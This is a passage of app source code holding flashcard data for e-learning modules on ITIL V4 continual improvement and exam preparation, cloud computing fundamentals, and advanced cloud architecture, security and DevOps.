                  'Critical Success Factors (CSFs) define WHAT must happen for the organisation to succeed. Key Performance Indicators (KPIs) measure HOW WELL the CSF is being achieved. For every CSF, there should be at least one KPI. KPIs should be few, meaningful, and directly tied to the CSF they measure.',
              'example':
                  'CSF: "Customer satisfaction with the service desk must be high." KPI: "CSAT score ≥ 90% monthly." CSF: "Incidents must be resolved quickly." KPI: "90% of P1 incidents resolved within 4 hours." Knowing the CSF → KPI relationship is directly tested on the exam.',
            },
            {
              'label': 'Measurement',
              'term': 'The Danger of Measuring the Wrong Things',
              'definition':
                  'ITIL V4 warns against "metric fixation" — optimising for metrics at the expense of actual value. If a service desk is measured only on call volume, staff will rush calls to inflate numbers, reducing quality. Metrics must measure VALUE, not just activity. Both quantitative and qualitative measures are needed.',
              'example':
                  'Scenario: A service desk KPI is "calls answered per hour." Staff start closing tickets prematurely to hit the target. CSAT drops from 87% to 63%. The KPI drove the wrong behaviour. ITIL V4 requires metrics to link to value outcomes — not just operational activity.',
            },
            {
              'label': 'Measurement',
              'term': 'Balanced Scorecard Approach to ITSM Metrics',
              'definition':
                  'ITIL V4 encourages measuring service performance across multiple perspectives — not just cost and efficiency. A balanced approach measures: Financial performance, Customer satisfaction, Internal process efficiency, and Learning & growth (people capability). No single category should dominate.',
              'example':
                  'An IT team reports 100% SLA compliance (financial/process ✓) but customer satisfaction is 55% (customer ✗) and staff turnover is 40% annually (learning & growth ✗). Balanced measurement reveals the full picture that single-metric reporting hides.',
            },
            {
              'label': 'Improvement Register',
              'term': 'Continual Improvement Register (CIR)',
              'definition':
                  'The Continual Improvement Register is a structured list of improvement opportunities and initiatives. It is used to record, prioritise, track, and review improvements across the organisation. All parts of the SVS can contribute items to the CIR. It ensures no improvement idea is lost.',
              'example':
                  'Scenario: A service desk analyst notices that 30% of incidents could be resolved with a self-service article. They log this in the CIR. The improvement is assessed, prioritised, and assigned. Without the CIR, the idea would be forgotten after the next team meeting.',
            },
            {
              'label': 'Measurement',
              'term': 'Leading vs Lagging Indicators',
              'definition':
                  'Lagging indicators measure past performance (e.g. number of P1 incidents last month). Leading indicators predict future performance (e.g. number of unpatched critical vulnerabilities today). ITIL V4 recommends using BOTH — lagging to assess historical trends, leading to enable proactive action.',
              'example':
                  'Exam scenario: "The organisation only measures incidents after they occur." This is lagging-only measurement. Adding monitoring of configuration drift, patch compliance, and error rates as leading indicators would enable the organisation to prevent incidents proactively.',
            },
            {
              'label': 'Application',
              'term': 'Applying the CI Model — Full Scenario',
              'definition':
                  'Scenario: Customer complaints about slow ticket resolution are rising. Step 1: Vision = best-in-class service quality. Step 2: MTTR = 5.2h average (data pulled). Step 3: Target = 2.5h within 90 days. Step 4: Plan = implement auto-triage + add two staff. Step 5: Execute in two phases. Step 6: After 90 days, MTTR = 2.3h (target met). Step 7: Publish result, identify next improvement (CSAT score).',
              'example':
                  'This scenario covers all seven steps in sequence. The exam may present a scenario with one or more steps missing and ask which step has been skipped. Know each step well enough to identify gaps.',
            },
            {
              'label': 'Exam prep',
              'term': 'Module 7 — Continual Improvement Exam Traps',
              'definition':
                  '1) CI model has SEVEN steps — not five, not six. 2) Step 2 requires OBJECTIVE data — not opinion. 3) Step 5 should be ITERATIVE — not big-bang. 4) Step 7 exists to maintain momentum — model is CIRCULAR. 5) CSF = what must happen. KPI = how well it is happening. 6) CI applies to ALL SVS components — not just services. 7) "Continual Service Improvement" is v3 language.',
              'example':
                  'Most exam questions on this module present a partial improvement story and ask what is missing or what happens next. If you can identify the CI model step from a scenario description, you will answer these correctly.',
            },
          ];

        // ── Module 08: ITIL V4 Foundation Exam Preparation ─────────────────
        case 'module-08':
          return [
            {
              'label': 'Exam overview',
              'term': 'ITIL V4 Foundation Exam — Format and Requirements',
              'definition':
                  'The ITIL V4 Foundation exam consists of 40 multiple-choice questions. Candidates have 60 minutes. The pass mark is 65% — 26 out of 40 correct answers required. No negative marking — always guess if unsure. The exam is closed book. Questions test understanding and application, not memorisation alone.',
              'example':
                  'Exam strategy: 60 minutes ÷ 40 questions = 90 seconds per question. Flag difficult questions and return to them. On scenario questions, eliminate obviously wrong answers first, then choose between the remaining two. Never leave a question blank — no penalty for wrong answers.',
            },
            {
              'label': 'Exam overview',
              'term': 'Question Types on the ITIL V4 Foundation Exam',
              'definition':
                  'Three question types appear: 1) Knowledge questions — define a term or concept. 2) Comprehension questions — explain why something is important. 3) Application/scenario questions — a situation is described and you identify the correct practice, principle, or action. Scenario questions are the majority — approximately 60% of the exam.',
              'example':
                  'Tip: Knowledge questions test definitions. Comprehension questions test understanding. Scenario questions test whether you can APPLY the framework. The scenario questions are where most candidates lose marks — practice mapping situations to ITIL V4 concepts using the examples throughout this course.',
            },
            {
              'label': 'Rapid review',
              'term': 'The SVS — Five Components (Must Know Cold)',
              'definition':
                  'The five SVS components: 1) Guiding Principles, 2) Governance, 3) Service Value Chain, 4) Practices, 5) Continual Improvement. Input to SVS: Opportunity + Demand. Output: Value. Any exam option listing fewer or more components, or using different names, is wrong.',
              'example':
                  'Test yourself: close your eyes and name all five SVS components. Then name all seven guiding principles. Then name all six SVC activities. If you cannot do this from memory, you are not exam-ready. These are the highest-frequency exam topics.',
            },
            {
              'label': 'Rapid review',
              'term': 'The SVC — Six Activities (Must Know Cold)',
              'definition':
                  'The six SVC activities: Plan, Improve, Engage, Design & Transition, Obtain/Build, Deliver & Support. Remember: they are flexible — not a fixed sequence. Each activity takes inputs and produces outputs. ALL activities can involve ALL four dimensions and ALL practices.',
              'example':
                  'Memory aid: "PIEDOD" — Plan, Improve, Engage, Design & Transition, Obtain/Build, Deliver & Support. Or use any mnemonic that gives you all six. Exam questions often name five activities and ask which is missing — know all six precisely.',
            },
            {
              'label': 'Rapid review',
              'term': 'The Seven Guiding Principles (Must Know Cold)',
              'definition':
                  '1) Focus on Value. 2) Start Where You Are. 3) Progress Iteratively with Feedback. 4) Collaborate and Promote Visibility. 5) Think and Work Holistically. 6) Keep It Simple and Practical. 7) Optimise and Automate. Universal — apply to every initiative. Not in a hierarchy — all seven are equal.',
              'example':
                  'Memory aid: "FoSPCTKO" or any mnemonic using the first letters: F-S-P-C-T-K-O. Exam questions describe a scenario violating a principle and ask which one. Know each principle well enough to match a scenario description to the correct principle name.',
            },
            {
              'label': 'Rapid review',
              'term': 'The Four Dimensions (Must Know Cold)',
              'definition':
                  '1) Organisations & People. 2) Information & Technology. 3) Partners & Suppliers. 4) Value Streams & Processes. All four apply to every service and SVS component. External factors (PESTLE) affect all four. No dimension is optional.',
              'example':
                  'Quick-fire: Culture = O&P. CMDB = I&T. Third-party cloud vendor = P&S. Incident process steps = VS&P. GDPR compliance = I&T (data) and P&S (supplier contracts). PESTLE = external constraints on ALL four dimensions.',
            },
            {
              'label': 'Rapid review',
              'term': 'Key Definitions — Must-Know List',
              'definition':
                  'Service = enables value co-creation. Incident = unplanned interruption. Problem = cause of incidents. Known Error = problem with documented workaround. Change = addition/modification/removal affecting services. Service Request = pre-defined user request (not an incident). Event = change of state with significance for service management.',
              'example':
                  'The exam tests whether you know the ITIL-specific definition of each term — not the everyday English meaning. "Change" in ITIL is not just any alteration; it specifically affects services. "Event" in ITIL is not just anything that happens — it is a change of state that is significant to service management.',
            },
            {
              'label': 'Rapid review',
              'term': 'Practices — The 18 Foundation-Tested Practices',
              'definition':
                  'The 18 practices tested in depth at Foundation level include: Incident Management, Problem Management, Change Enablement, Service Request Management, Service Desk, Service Level Management, Monitoring & Event Management, IT Asset Management, Service Configuration Management, Release Management, Deployment Management, Continual Improvement, Knowledge Management, Relationship Management, Supplier Management, Service Catalogue Management, Service Design, and Business Analysis.',
              'example':
                  'You do not need to know all 34 practices for Foundation — but you must know these 18 well. For each, know: its purpose, key terms it owns, which SVC activities it supports, and how it differs from similar practices (especially Incident vs Problem, Release vs Deployment, Request vs Incident).',
            },
            {
              'label': 'Exam strategy',
              'term': 'Eliminating Wrong Answers — Technique',
              'definition':
                  'ITIL V4 exam distractors often use: v3 language ("Continual Service Improvement," "Change Management"), incorrect scope (e.g. saying governance is management), conflation of similar practices (Release vs Deployment), and absolute language ("always," "never," "only") — ITIL V4 guidance rarely uses absolutes. Eliminate these patterns first.',
              'example':
                  'If an answer option says "the provider delivers value to the customer," eliminate it — V4 says value is CO-CREATED. If an answer says "the CAB must approve all changes," eliminate it — Standard changes bypass the CAB. If an answer uses "Continual Service Improvement," that is v3 language.',
            },
            {
              'label': 'Exam strategy',
              'term': 'Answering Scenario Questions — Method',
              'definition':
                  'Step 1: Identify what the scenario is describing (incident? problem? change? improvement?). Step 2: Identify the key action (restore service? find root cause? approve change? measure improvement?). Step 3: Match the action to the correct ITIL V4 concept (practice, principle, SVC activity, dimension). Step 4: Eliminate options that use wrong language or wrong scope.',
              'example':
                  'Scenario: "Users are complaining about repeated system crashes. The team is investigating why this keeps happening." Step 1: repeated crashes = Problem. Step 2: investigating why = root cause analysis. Step 3: Problem Management. Step 4: Eliminate "Incident Management" (restores, not investigates) and "Change Enablement" (not relevant here).',
            },
            {
              'label': 'Common mistakes',
              'term': 'Top 10 Reasons Candidates Fail ITIL V4 Foundation',
              'definition':
                  '1) Confusing Incident with Problem. 2) Saying value is "delivered" not "co-created." 3) Getting SVS components wrong (wrong count or names). 4) Using v3 lifecycle language. 5) Forgetting Utility AND Warranty are both required. 6) Thinking CI applies only to services. 7) Misidentifying OLA vs UC. 8) Saying optimise and automate are interchangeable. 9) Missing Step 7 of the CI model. 10) Not knowing all seven guiding principles by name.',
              'example':
                  'Review this list before your exam. Each of these mistakes has cost real candidates their pass mark. If you can confidently explain why each statement above is wrong, you are demonstrating the level of understanding the Foundation exam tests.',
            },
            {
              'label': 'Rapid review',
              'term': 'Value Co-Creation — The Central Thread of ITIL V4',
              'definition':
                  'The single most important concept in ITIL V4 is value co-creation. Every other concept — the SVS, SVC, four dimensions, practices, and guiding principles — exists in service of this one idea: IT and the business work together to create value. Neither can create value alone.',
              'example':
                  'Final exam thought: if you ever feel uncertain about an answer, ask yourself "which option best supports value co-creation between IT and the business?" ITIL V4 is built around this concept — answers that isolate IT from business, or that treat value as one-directional, are almost always wrong.',
            },
            {
              'label': 'Rapid review',
              'term': 'Full Framework Map — One Card Summary',
              'definition':
                  'SVS inputs: Demand + Opportunity. SVS components: Guiding Principles, Governance, SVC, Practices, Continual Improvement. SVS output: Value. SVC activities (6): Plan, Improve, Engage, Design & Transition, Obtain/Build, Deliver & Support. Four dimensions: O&P, I&T, P&S, VS&P. Guiding principles (7): FoV, SWyA, PIwF, CaPV, TaWH, KISaP, OaA. CI model: 7 steps.',
              'example':
                  'Use this card as your pre-exam 2-minute review. Every number and acronym here can be tested. If you can recite all of it accurately, you have the structural knowledge to pass. The exam tests whether you can also APPLY this structure — which is what all the scenario practice throughout this course builds.',
            },
            {
              'label': 'Exam prep',
              'term': 'Last 24 Hours Before the Exam — Checklist',
              'definition':
                  'DO: Review the 18 core practices and their key distinctions. Review the seven guiding principles with examples. Review the six SVC activities and what each does. Review the five SVS components. Review the seven CI model steps. DO NOT: Try to learn new material. Cram definitions you do not understand. Spend more than 2 hours reviewing.',
              'example':
                  'The night before: use the flashcards in this module for a timed 40-question self-test. Aim for 85%+ to give yourself a buffer. If you score below 75%, identify the weak areas and do targeted review — do not re-read everything. Targeted revision beats general re-reading.',
            },
          ];

        default:
          return _itilV4Default();
      }
    }

    // ── Binary Cloud ───────────────────────────────────────────────────────
    if (tag == 'Binary Cloud') {
      switch (moduleId) {
        case 'module-01':
          return [
            {
              'label': 'Definition',
              'term': 'What is cloud computing?',
              'definition':
                  'Cloud computing is the delivery of computing services — including servers, storage, databases, networking, software, and analytics — over the internet ("the cloud"). You pay for only what you use, rather than owning physical hardware.',
              'example':
                  'Instead of buying a server for your website, you rent computing power from AWS. When traffic spikes, you scale up instantly and pay for the extra hours only.',
            },
            {
              'label': 'Core concept',
              'term': 'On-Premises vs Cloud',
              'definition':
                  'On-premises (on-prem) means you own and manage your own physical hardware in your own data centre. Cloud means a provider manages the hardware and you access resources remotely over the internet.',
              'example':
                  'On-prem: your company owns servers in a basement IT room. Cloud: your company\'s files live on Google Drive and can be accessed from anywhere.',
            },
            {
              'label': 'Core concept',
              'term': 'The 5 Characteristics of Cloud (NIST)',
              'definition':
                  'NIST defines cloud by five essential characteristics: 1) On-demand self-service, 2) Broad network access, 3) Resource pooling, 4) Rapid elasticity, 5) Measured service (pay-as-you-go).',
              'example':
                  'You log into AWS, spin up a new server in 60 seconds without calling anyone (self-service), use it from your laptop anywhere (broad access), and are billed per hour (measured service).',
            },
            {
              'label': 'Key benefit',
              'term': 'Scalability & Elasticity',
              'definition':
                  'Scalability is the ability to increase capacity when needed. Elasticity means the system automatically scales up and down based on demand, so you never over-provision or under-provision resources.',
              'example':
                  'A retail website scales up to handle Black Friday traffic automatically, then scales back down overnight — you only pay for what was used.',
            },
            {
              'label': 'Key benefit',
              'term': 'CapEx vs OpEx',
              'definition':
                  'Traditional IT uses Capital Expenditure (CapEx) — large upfront purchases of hardware. Cloud uses Operational Expenditure (OpEx) — ongoing pay-as-you-go costs. Cloud converts big one-time costs into predictable monthly expenses.',
              'example':
                  'Buying a \$50,000 server is CapEx. Paying \$500/month for equivalent cloud resources is OpEx — better for cash flow and flexibility.',
            },
          ];
        case 'module-02':
          return [
            {
              'label': 'Service model',
              'term': 'Infrastructure as a Service (IaaS)',
              'definition':
                  'IaaS provides virtualised computing infrastructure over the internet — servers, storage, and networking. You manage the OS, middleware, and applications. The provider manages the physical hardware.',
              'example':
                  'AWS EC2 gives you a virtual server. You choose the OS, install software, and manage it yourself. The physical machine is Amazon\'s problem.',
            },
            {
              'label': 'Service model',
              'term': 'Platform as a Service (PaaS)',
              'definition':
                  'PaaS provides a platform allowing developers to build, run, and manage applications without worrying about the underlying infrastructure. The provider manages the OS, runtime, and servers.',
              'example':
                  'Heroku lets you deploy a web app by pushing code. You don\'t configure servers, install Node.js, or patch the OS — Heroku handles all of that.',
            },
            {
              'label': 'Service model',
              'term': 'Software as a Service (SaaS)',
              'definition':
                  'SaaS delivers fully functional software over the internet, managed entirely by the provider. You just use the application through a browser — no installation, no maintenance.',
              'example':
                  'Gmail, Slack, Salesforce, and Zoom are all SaaS. You log in and use them — you never think about the servers they run on.',
            },
            {
              'label': 'Comparison',
              'term': 'IaaS vs PaaS vs SaaS — Who manages what?',
              'definition':
                  'IaaS: You manage OS, apps, data. Provider manages hardware. PaaS: You manage apps and data only. Provider manages OS and hardware. SaaS: Provider manages everything. You just use the software.',
              'example':
                  'Think of it as pizza: IaaS = ingredients delivered (you cook). PaaS = pizza kit (you assemble). SaaS = pizza delivered and ready to eat.',
            },
            {
              'label': 'Emerging model',
              'term': 'Serverless / FaaS',
              'definition':
                  'Serverless (Function as a Service) lets you run code without provisioning or managing servers. You write a function, deploy it, and only pay when it executes. The cloud scales it automatically.',
              'example':
                  'AWS Lambda runs your image-resize function every time a user uploads a photo. You pay per execution (milliseconds), not per server hour.',
            },
          ];
        case 'module-03':
          return [
            {
              'label': 'Deployment model',
              'term': 'Public Cloud',
              'definition':
                  'Public cloud resources are owned and operated by a third-party provider and shared across multiple customers over the internet. Resources are provisioned on-demand and billed pay-as-you-go.',
              'example':
                  'AWS, Microsoft Azure, and Google Cloud are public clouds. Your servers share physical hardware with other companies\' workloads (but are logically isolated).',
            },
            {
              'label': 'Deployment model',
              'term': 'Private Cloud',
              'definition':
                  'A private cloud is cloud infrastructure dedicated to a single organisation, either on-premises or hosted by a provider. It offers greater control, customisation, and security but at higher cost.',
              'example':
                  'A bank runs its own virtualised data centre using VMware. Only the bank\'s employees use it — no resource sharing with outsiders.',
            },
            {
              'label': 'Deployment model',
              'term': 'Hybrid Cloud',
              'definition':
                  'Hybrid cloud combines public and private clouds, allowing data and applications to move between them. Organisations keep sensitive workloads on-prem and use public cloud for burst capacity or less critical apps.',
              'example':
                  'A hospital stores patient records on its private cloud (compliance) but uses AWS for its public-facing appointment booking website.',
            },
            {
              'label': 'Deployment model',
              'term': 'Multi-Cloud',
              'definition':
                  'Multi-cloud means using services from two or more cloud providers simultaneously. It avoids vendor lock-in, improves resilience, and lets you pick the best service from each provider.',
              'example':
                  'A company hosts its website on AWS, uses Google BigQuery for analytics, and Microsoft Azure for Active Directory — all at the same time.',
            },
            {
              'label': 'Key concept',
              'term': 'Vendor Lock-In',
              'definition':
                  'Vendor lock-in occurs when a customer becomes too dependent on a single cloud provider\'s proprietary services, making it difficult and expensive to switch providers later.',
              'example':
                  'If your entire app is built using AWS-specific services like DynamoDB and Lambda, migrating to Azure would require rewriting significant portions of your application.',
            },
          ];
        case 'module-04':
          return [
            {
              'label': 'Core service',
              'term': 'Compute (Virtual Machines)',
              'definition':
                  'Cloud compute services provide virtual servers you can provision on demand. You choose the CPU, RAM, and OS. VMs run your applications just like a physical server but are software-defined.',
              'example':
                  'AWS EC2, Azure Virtual Machines, and Google Compute Engine all let you spin up a Linux or Windows server in minutes.',
            },
            {
              'label': 'Core service',
              'term': 'Cloud Storage Types',
              'definition':
                  'Cloud storage comes in three types: Object storage (files/blobs — e.g. S3), Block storage (like a hard drive attached to a VM — e.g. EBS), and File storage (shared network drives — e.g. EFS).',
              'example':
                  'Object: store user profile photos on S3. Block: attach extra disk space to an EC2 instance. File: share a folder between multiple servers.',
            },
            {
              'label': 'Core service',
              'term': 'Managed Databases',
              'definition':
                  'Cloud providers offer managed database services where they handle backups, patching, replication, and scaling. You focus on your data, not database administration.',
              'example':
                  'AWS RDS runs MySQL for you — automated backups, multi-AZ failover, and no OS patching required. You just connect and query.',
            },
            {
              'label': 'Core service',
              'term': 'Content Delivery Network (CDN)',
              'definition':
                  'A CDN is a globally distributed network of servers that caches content close to users, reducing latency and improving load times. It\'s essential for fast websites with global audiences.',
              'example':
                  'CloudFront caches your website\'s images at 400+ edge locations worldwide. A user in Tokyo gets served from a nearby server instead of your US origin.',
            },
            {
              'label': 'Core service',
              'term': 'Auto Scaling',
              'definition':
                  'Auto Scaling automatically adjusts the number of compute resources based on demand. It adds capacity when load increases and removes it when load drops, optimising both performance and cost.',
              'example':
                  'Your app\'s traffic doubles during lunch hour. Auto Scaling adds two more servers automatically, then removes them at 3pm when traffic drops.',
            },
          ];
        case 'module-05':
          return [
            {
              'label': 'Security concept',
              'term': 'Shared Responsibility Model',
              'definition':
                  'In cloud, security is a shared responsibility. The provider secures the infrastructure (hardware, network, physical facilities). The customer secures what they put on it (data, access controls, OS configuration).',
              'example':
                  'AWS is responsible for the physical data centre security. You are responsible for not leaving your S3 bucket publicly readable and rotating your access keys.',
            },
            {
              'label': 'Security concept',
              'term': 'Identity and Access Management (IAM)',
              'definition':
                  'IAM controls who can access your cloud resources and what they can do. You create users, groups, and roles with specific permissions following the principle of least privilege.',
              'example':
                  'Your developer\'s IAM role allows reading from S3 but cannot delete EC2 instances. Your billing team can view invoices but cannot touch any infrastructure.',
            },
            {
              'label': 'Security concept',
              'term': 'Encryption at Rest and in Transit',
              'definition':
                  'Encryption at rest protects stored data (e.g. encrypted hard drives, databases). Encryption in transit protects data moving across networks (e.g. TLS/HTTPS). Both are required for a complete security posture.',
              'example':
                  'Your S3 bucket is encrypted with AES-256 at rest. Data sent between your app and the database uses TLS so it cannot be intercepted in transit.',
            },
            {
              'label': 'Security concept',
              'term': 'Security Groups and Network ACLs',
              'definition':
                  'Security Groups are virtual firewalls at the instance level that control inbound and outbound traffic. Network ACLs operate at the subnet level. Together they form layered network security in the cloud.',
              'example':
                  'Your web server\'s security group allows inbound port 443 (HTTPS) from anywhere but blocks all other ports. Only the load balancer can reach your app servers.',
            },
            {
              'label': 'Compliance',
              'term': 'Cloud Compliance Frameworks',
              'definition':
                  'Cloud environments must comply with industry standards depending on the workload: HIPAA (healthcare), PCI-DSS (payment cards), SOC 2 (service organisations), and GDPR (EU data protection).',
              'example':
                  'A healthcare startup stores patient data on AWS. They must ensure their configuration meets HIPAA requirements — encrypted storage, audit logs, and strict access controls.',
            },
          ];
        case 'module-06':
          return [
            {
              'label': 'Networking',
              'term': 'Virtual Private Cloud (VPC)',
              'definition':
                  'A VPC is a logically isolated section of the cloud where you can launch resources in a virtual network that you define. You control IP ranges, subnets, route tables, and gateways.',
              'example':
                  'You create a VPC with a public subnet (for web servers facing the internet) and a private subnet (for databases that should never be publicly accessible).',
            },
            {
              'label': 'Networking',
              'term': 'Subnets in the Cloud',
              'definition':
                  'A subnet is a range of IP addresses within your VPC. Public subnets have a route to an internet gateway. Private subnets do not — they are isolated from the internet.',
              'example':
                  'Your web tier lives in a public subnet with a public IP. Your database lives in a private subnet — it can only be reached from the web tier, never directly from the internet.',
            },
            {
              'label': 'Networking',
              'term': 'Load Balancers',
              'definition':
                  'A load balancer distributes incoming traffic across multiple servers to ensure no single server is overwhelmed. It also provides health checks and removes unhealthy instances automatically.',
              'example':
                  'Your app has 3 web servers. The load balancer sends each user request to whichever server is least busy. If one crashes, the load balancer stops sending it traffic.',
            },
            {
              'label': 'Networking',
              'term': 'DNS in the Cloud (Route 53 / Cloud DNS)',
              'definition':
                  'Cloud providers offer managed DNS services that route users to your applications. They support routing policies like latency-based, geolocation, failover, and weighted routing.',
              'example':
                  'Route 53 detects your US server is down and automatically routes traffic to your EU backup server — failover routing with no manual intervention.',
            },
            {
              'label': 'Networking',
              'term': 'Availability Zones & Regions',
              'definition':
                  'A Region is a geographic area containing multiple data centres. An Availability Zone (AZ) is one or more data centres within a region, isolated from failures in other AZs. Deploying across AZs gives high availability.',
              'example':
                  'You deploy your app in us-east-1 across 3 AZs. If one data centre loses power, your app keeps running in the other two AZs automatically.',
            },
          ];
        default:
          return _cloudFundamentalsDefault();
      }
    }

    // ── Binary Cloud Pro ───────────────────────────────────────────────────
    if (tag == 'Binary Cloud Pro') {
      switch (moduleId) {
        case 'module-01':
          return [
            {
              'label': 'Architecture',
              'term': 'Well-Architected Framework',
              'definition':
                  'The AWS Well-Architected Framework defines best practices across six pillars: Operational Excellence, Security, Reliability, Performance Efficiency, Cost Optimisation, and Sustainability.',
              'example':
                  'Before launching a production system, a cloud architect reviews each pillar — ensuring the design is secure, will recover from failures, performs well, and doesn\'t waste money.',
            },
            {
              'label': 'Architecture',
              'term': 'High Availability (HA)',
              'definition':
                  'High Availability is the ability of a system to remain operational and accessible with minimal downtime. It is achieved through redundancy — deploying across multiple AZs, regions, or servers so a single failure doesn\'t take the system offline.',
              'example':
                  'Your database runs as a primary in us-east-1a and a standby replica in us-east-1b. If the primary fails, the standby promotes automatically in under 60 seconds.',
            },
            {
              'label': 'Architecture',
              'term': 'Fault Tolerance vs High Availability',
              'definition':
                  'High Availability minimises downtime (brief interruption possible). Fault Tolerance means the system continues operating with zero interruption even when a component fails — it requires full redundancy at every layer.',
              'example':
                  'HA: your site has a 30-second failover. Fault tolerant: your site has redundant hardware so failure of any single component causes zero user impact.',
            },
            {
              'label': 'Architecture',
              'term': 'Loose Coupling',
              'definition':
                  'Loose coupling designs systems so components interact through well-defined interfaces and are not tightly dependent on each other. If one component fails or changes, it doesn\'t cascade failures to others.',
              'example':
                  'Instead of your order service calling your inventory service directly, both publish and subscribe to an SQS queue. The inventory service can be restarted without the order service knowing.',
            },
            {
              'label': 'Architecture',
              'term': 'Infrastructure as Code (IaC)',
              'definition':
                  'IaC manages and provisions cloud infrastructure through machine-readable configuration files instead of manual processes. It enables version control, reproducibility, and automated deployments.',
              'example':
                  'A Terraform file defines your entire AWS environment — VPCs, EC2 instances, RDS databases. Running "terraform apply" builds everything in minutes, identically every time.',
            },
          ];
        case 'module-02':
          return [
            {
              'label': 'Advanced compute',
              'term': 'Containers & Docker',
              'definition':
                  'A container packages an application and all its dependencies into a single portable unit. Unlike VMs, containers share the host OS kernel — they start in seconds and use far less memory.',
              'example':
                  'Your Node.js app runs in a Docker container. The same container image runs identically on your laptop, in CI/CD, and in production — eliminating "works on my machine" problems.',
            },
            {
              'label': 'Advanced compute',
              'term': 'Kubernetes (K8s)',
              'definition':
                  'Kubernetes is a container orchestration platform that automates deployment, scaling, and management of containerised applications. It ensures containers are always running, restarts failed ones, and distributes load.',
              'example':
                  'You deploy 10 replicas of your API container to K8s. K8s distributes them across nodes, restarts any that crash, and scales to 50 replicas during peak traffic.',
            },
            {
              'label': 'Advanced compute',
              'term': 'Serverless Architecture',
              'definition':
                  'Serverless architecture composes applications entirely from managed services and functions, with no servers to provision or maintain. It scales to zero (no cost when idle) and infinitely.',
              'example':
                  'API Gateway receives a request → triggers a Lambda function → Lambda writes to DynamoDB → result returned. No servers, no idle cost, scales to millions of requests automatically.',
            },
            {
              'label': 'Advanced compute',
              'term': 'Spot / Preemptible Instances',
              'definition':
                  'Spot instances (AWS) or Preemptible VMs (GCP) are spare cloud capacity sold at up to 90% discount. The catch: the provider can reclaim them with 2 minutes notice when capacity is needed elsewhere.',
              'example':
                  'Your ML training job uses Spot instances to cut costs by 70%. The job checkpoints progress so if a Spot instance is reclaimed, it resumes from where it left off.',
            },
            {
              'label': 'Advanced compute',
              'term': 'Reserved vs On-Demand Instances',
              'definition':
                  'On-Demand: pay full price per hour, no commitment. Reserved Instances: commit to 1 or 3 years for up to 72% discount. Savings Plans offer similar discounts with more flexibility.',
              'example':
                  'Your database runs 24/7 — buy a 1-year Reserved Instance and save 40%. Your dev environment runs 9-5 only — use On-Demand so you\'re not paying for idle nights.',
            },
          ];
        case 'module-03':
          return [
            {
              'label': 'Storage',
              'term': 'S3 Storage Classes',
              'definition':
                  'S3 offers multiple storage classes: Standard (frequent access), Infrequent Access (monthly access, cheaper), Glacier (archival, hours to retrieve), and Glacier Deep Archive (cheapest, 12-hour retrieval).',
              'example':
                  'Store active user photos in S3 Standard. Move photos not accessed in 90 days to S3-IA automatically. Archive compliance documents to Glacier for \$0.004/GB/month.',
            },
            {
              'label': 'Database',
              'term': 'Relational vs NoSQL in the Cloud',
              'definition':
                  'Relational databases (RDS, Cloud SQL) use structured tables with SQL — ideal for transactions and complex queries. NoSQL (DynamoDB, Firestore) uses flexible schemas — ideal for high-speed, high-scale key-value or document access.',
              'example':
                  'Use RDS for financial transactions that need ACID compliance. Use DynamoDB for user sessions that need single-digit millisecond reads at millions of requests per second.',
            },
            {
              'label': 'Database',
              'term': 'Read Replicas & Sharding',
              'definition':
                  'Read replicas offload read traffic from the primary database to one or more replica copies. Sharding horizontally partitions data across multiple database instances, distributing both storage and read/write load.',
              'example':
                  'Your e-commerce site\'s primary RDS handles all writes. 3 read replicas serve product browsing queries, reducing primary load by 80%.',
            },
            {
              'label': 'Storage',
              'term': 'Data Lakes & Warehouses',
              'definition':
                  'A data lake stores raw, unstructured data at massive scale (e.g. S3). A data warehouse stores structured, processed data optimised for analytics queries (e.g. Redshift, BigQuery).',
              'example':
                  'Raw clickstream events land in S3 (data lake). An ETL pipeline processes and loads them into Redshift (warehouse) where analysts run SQL reports.',
            },
            {
              'label': 'Storage',
              'term': 'Backup & Disaster Recovery Strategies',
              'definition':
                  'RTO (Recovery Time Objective) is the maximum acceptable downtime. RPO (Recovery Point Objective) is the maximum acceptable data loss. DR strategies range from Backup & Restore (cheapest) to Multi-Site Active-Active (instant).',
              'example':
                  'RTO: 4 hours, RPO: 1 hour means you must be back online within 4 hours and can lose at most 1 hour of data. This drives your backup frequency and standby configuration.',
            },
          ];
        case 'module-04':
          return [
            {
              'label': 'Advanced security',
              'term': 'Zero Trust in the Cloud',
              'definition':
                  'Zero Trust assumes no implicit trust based on network location. Every request must be authenticated, authorised, and encrypted. It replaces the traditional "castle and moat" perimeter model.',
              'example':
                  'Even a request from an internal microservice must present a valid JWT token. The receiving service verifies it against an identity provider before processing.',
            },
            {
              'label': 'Advanced security',
              'term': 'Cloud Security Posture Management (CSPM)',
              'definition':
                  'CSPM tools continuously monitor cloud environments for misconfigurations, policy violations, and compliance drift. They provide visibility across accounts and auto-remediate common issues.',
              'example':
                  'Your CSPM tool detects an S3 bucket was accidentally made public, alerts your security team immediately, and automatically reverts the ACL to private.',
            },
            {
              'label': 'Advanced security',
              'term': 'Secrets Management',
              'definition':
                  'Secrets management is the practice of securely storing, accessing, and rotating sensitive credentials using dedicated services rather than hardcoding them in code.',
              'example':
                  'AWS Secrets Manager stores your database password. Your Lambda function fetches it at runtime — the password is never in your code, environment variables, or Git.',
            },
            {
              'label': 'Advanced security',
              'term': 'DDoS Protection in the Cloud',
              'definition':
                  'Cloud providers offer DDoS protection at multiple layers: network-level (absorbing volumetric attacks) and application-level (WAF rules blocking malicious HTTP traffic).',
              'example':
                  'AWS Shield Advanced protects your ALB from volumetric attacks. AWS WAF sits in front of CloudFront, blocking SQL injection and XSS attempts before they reach your app.',
            },
            {
              'label': 'Advanced security',
              'term': 'Penetration Testing in the Cloud',
              'definition':
                  'Cloud pen testing follows the same principles as traditional pen testing but must comply with provider policies. AWS, Azure, and GCP allow pen testing on your own resources but prohibit testing shared infrastructure.',
              'example':
                  'Your team runs a pen test against your AWS environment — testing EC2 instances, API Gateway endpoints, and S3 configurations — all permitted under AWS\'s pen testing policy.',
            },
          ];
        case 'module-05':
          return [
            {
              'label': 'DevOps',
              'term': 'CI/CD Pipeline',
              'definition':
                  'CI (Continuous Integration) automatically builds and tests code on every commit. CD (Continuous Delivery/Deployment) automatically deploys tested code to staging or production.',
              'example':
                  'Developer pushes code → GitHub Actions runs unit tests → Docker image built → pushed to ECR → ECS deploys the new version. All automated, taking under 10 minutes.',
            },
            {
              'label': 'DevOps',
              'term': 'Blue/Green Deployment',
              'definition':
                  'Blue/Green deployment maintains two identical environments. Traffic switches instantly from the current version (blue) to the new version (green), with instant rollback capability.',
              'example':
